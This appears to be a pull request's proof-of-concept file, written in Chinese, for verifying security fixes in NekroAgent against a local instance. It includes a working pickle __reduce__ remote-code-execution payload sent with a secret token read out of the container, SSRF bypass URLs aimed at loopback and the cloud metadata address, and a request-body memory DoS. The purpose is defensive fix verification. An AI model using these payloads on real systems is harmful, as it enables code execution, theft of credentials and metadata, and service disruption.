# 安全修复最小复现 PoC

本文件提供 PR 中各项安全修复的最小复现步骤,全部可在本地按顺序执行。
环境约定:`http://127.0.0.1:8021` 为运行中的 NekroAgent 实例。

## 1. RPC pickle RCE(修复前:宿主进程任意代码执行)

前置:从进程内获取 RPC 令牌(模拟沙箱内代码读出注入的密钥,即攻击前提)。

```bash
docker exec nekro_agent .venv/bin/python -c "
import sys; sys.path.insert(0, '/app')
from nekro_agent.core.os_env import OsEnv
print(OsEnv.RPC_SECRET_KEY)"
```

复现(修复后返回 400,标记文件不产生):

```python
import pickle, urllib.request, urllib.error

RPC_KEY = "<上一步输出>"
URL = "http://127.0.0.1:8021/api/ext/rpc_exec?container_key=x&from_chat_key=y"

class RCE:
    def __reduce__(self):
        import os
        return (os.system, ("touch /tmp/pwned",))

req = urllib.request.Request(
    URL, data=pickle.dumps(RCE()),
    headers={"X-RPC-Token": RPC_KEY, "Content-Type": "application/octet-stream"})
try:
    urllib.request.urlopen(req)
    print("VULNERABLE")  # 修复前:RCE 成功
except urllib.error.HTTPError as e:
    print(e.code)        # 修复后:400
```

判定:`/tmp/pwned` 不存在 且 状态码 400 → 已修复。

## 2. SSRF — IPv4-mapped IPv6 绕过(修复前:可访问环回/云元数据)

```python
from nekro_agent.tools.common_util import download_file, BlockedDownloadAddress

for url in ("http://[::ffff:127.0.0.1]/api/health",
            "http://[::ffff:169.254.169.254]/latest/meta-data"):
    try:
        await download_file(url)          # 修复前:请求真实发出
        print("VULNERABLE")
    except BlockedDownloadAddress:
        print("blocked:", url)            # 修复后
```

## 3. SSRF — DNS 重绑定(修复前:校验与连接间二次解析)

模拟交替 DNS 的最小单测见 `tests/test_ssrf_guard.py::test_download_pins_connection_and_revalidates_redirects`:
解析函数奇数次返回公网 IP、偶数次返回 `127.0.0.1`,断言实际连接目标始终为
首次校验的公网 IP、重定向到内网名的跳被拒、连接阶段无额外解析。

## 4. Webhook 默认鉴权(修复前:无令牌可直接调用插件处理器)

```bash
# 未配置 NEKRO_WEBHOOK_SECRET_KEY 时:
curl -s -o /dev/null -w "%{http_code}\n" \
  -X POST http://127.0.0.1:8021/api/webhook/anything \
  -H 'Content-Type: application/json' -d '{}'
# 修复前: 404 (越过鉴权,端点不存在才 404)
# 修复后: 401 (fail-closed)
```

## 5. CORS 通配拒绝(修复前:NEKRO_CORS_ORIGINS=* 重新引入 Origin 反射)

```bash
NEKRO_CORS_ORIGINS='*' docker compose up -d
docker logs nekro_agent 2>&1 | tail -5
# 修复后: ValueError: NEKRO_CORS_ORIGINS 不允许通配符来源: * ,服务拒绝启动
```

## 6. RPC 请求体上限(修复前:任意大 pickle 内存 DoS)

```bash
head -c 9437184 /dev/zero > /tmp/big.bin
curl -s -o /dev/null -w "%{http_code}\n" \
  -X POST "http://127.0.0.1:8021/api/ext/rpc_exec?container_key=x&from_chat_key=y" \
  -H "X-RPC-Token: <key>" --data-binary @/tmp/big.bin
# 修复后: 413
```
